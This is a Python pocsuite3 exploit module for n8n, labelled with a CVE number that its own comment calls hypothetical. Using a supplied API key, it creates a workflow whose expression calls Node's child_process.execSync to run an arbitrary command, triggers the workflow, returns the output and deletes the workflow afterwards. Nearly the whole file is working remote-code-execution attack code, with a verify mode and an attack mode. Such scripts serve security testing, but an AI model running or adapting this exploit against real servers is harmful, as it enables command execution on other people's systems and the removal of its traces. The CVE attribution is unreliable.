#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json
import random
import string
from collections import OrderedDict
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, OptString, VUL_TYPE
from pocsuite3.lib.core.common import get_host_port

class N8nRCE(POCBase):
    vulID = 'CVE-2025-68613'  # 假设的CVE编号，根据用户输入
    version = '1.0'
    author = ['SecurityAnalyst']
    vulDate = '2025-01-01'
    createDate = '2025-01-01'
    updateDate = '2025-01-01'
    references = ['https://n8n.io']
    name = 'n8n Authenticated RCE'
    appPowerLink = 'https://n8n.io'
    appName = 'n8n'
    appVersion = 'All'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''
    n8n Workflow Execution Remote Code Execution Vulnerability.
    Attackers with a valid API Key can create a workflow containing 
    malicious JavaScript (Node.js) to execute arbitrary system commands.
    '''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _options(self):
        o = OrderedDict()
        # 添加自定义参数，因为该漏洞需要认证
        o["api_key"] = OptString("", description="The X-N8N-API-KEY for authentication", require=True)
        o["cmd"] = OptString("id", description="Command to execute in attack mode", require=False)
        return o

    def _create_workflow(self, url, api_key, payload_expression):
        """
        Helper function to create the malicious workflow
        """
        headers = {
            'Content-Type': 'application/json',
            'X-N8N-API-KEY': api_key
        }

        # 构造 Workflow JSON 结构
        workflow_name = "PoC_Scan_" + ''.join(random.sample(string.ascii_letters, 6))
        
        workflow_data = {
            "name": workflow_name,
            "nodes": [
                {
                    "parameters": {},
                    "name": "Start",
                    "type": "n8n-nodes-base.manualTrigger",
                    "typeVersion": 1,
                    "position": [240, 300]
                },
                {
                    "parameters": {
                        "values": {
                            "string": [
                                {
                                    "name": "output",
                                    "value": payload_expression
                                }
                            ]
                        },
                        "options": {}
                    },
                    "name": "Exploit",
                    "type": "n8n-nodes-base.set",
                    "typeVersion": 3,
                    "position": [460, 300]
                }
            ],
            "connections": {
                "Start": {
                    "main": [
                        [
                            {
                                "node": "Exploit",
                                "type": "main",
                                "index": 0
                            }
                        ]
                    ]
                }
            },
            "active": False,
            "settings": {},
            "tags": []
        }

        try:
            resp = requests.post(f"{url}/rest/workflows", headers=headers, json=workflow_data, timeout=10)
            if resp.status_code in [200, 201]:
                return resp.json().get('id')
        except Exception as e:
            pass
        return None

    def _execute_workflow(self, url, api_key, workflow_id):
        """
        Helper function to trigger the workflow
        """
        headers = {
            'Content-Type': 'application/json',
            'X-N8N-API-KEY': api_key
        }
        try:
            resp = requests.post(f"{url}/rest/workflows/{workflow_id}/run", headers=headers, timeout=10)
            if resp.status_code == 200:
                return resp.json()
        except Exception:
            pass
        return None

    def _delete_workflow(self, url, api_key, workflow_id):
        """
        Cleanup function
        """
        headers = {
            'X-N8N-API-KEY': api_key
        }
        try:
            requests.delete(f"{url}/rest/workflows/{workflow_id}", headers=headers, timeout=5)
        except Exception:
            pass

    def _verify(self):
        """
        Verify mode: Execute a safe calculation to confirm JS execution
        """
        result = Output(self)
        target_url = self.url.rstrip('/')
        api_key = self.get_option("api_key")

        if not api_key:
            result.success = False
            result.error = "API Key is required. Use --options '{\"api_key\":\"<key>\"}'"
            return result

        # Payload: 简单的数学计算，验证 JS 是否执行
        # {{ 11111 + 22222 }} -> 33333
        payload = "{{ 11111 + 22222 }}"
        
        workflow_id = self._create_workflow(target_url, api_key, payload)
        
        if workflow_id:
            try:
                exec_result = self._execute_workflow(target_url, api_key, workflow_id)
                
                # 清理环境
                self._delete_workflow(target_url, api_key, workflow_id)

                # 检查结果
                if exec_result and 'data' in exec_result:
                    try:
                        # 解析 n8n 复杂的 JSON 响应结构
                        output_val = exec_result['data']['result']['data']['main'][0][0]['json']['output']
                        if str(output_val) == "33333":
                            result.success = True
                            result.url = target_url
                            result.vul_url = target_url
                            result.info = f"Vulnerable! JS Expression executed. Result: {output_val}"
                    except (KeyError, IndexError, TypeError):
                        pass
            except Exception as e:
                pass
        
        return result

    def _attack(self):
        """
        Attack mode: Execute system command (default: id)
        """
        result = Output(self)
        target_url = self.url.rstrip('/')
        api_key = self.get_option("api_key")
        cmd = self.get_option("cmd") or "id"

        if not api_key:
            result.success = False
            result.error = "API Key is required."
            return result

        # Payload: Node.js child_process execution
        payload = "{{ require('child_process').execSync('" + cmd + "').toString() }}"
        
        workflow_id = self._create_workflow(target_url, api_key, payload)
        
        if workflow_id:
            try:
                exec_result = self._execute_workflow(target_url, api_key, workflow_id)
                self._delete_workflow(target_url, api_key, workflow_id)

                if exec_result and 'data' in exec_result:
                    try:
                        output_val = exec_result['data']['result']['data']['main'][0][0]['json']['output']
                        if output_val:
                            result.success = True
                            result.url = target_url
                            result.vul_url = target_url
                            result.info = f"Command '{cmd}' executed:\n{output_val.strip()}"
                    except Exception:
                        pass
            except Exception:
                pass

        return result

register_poc(N8nRCE)
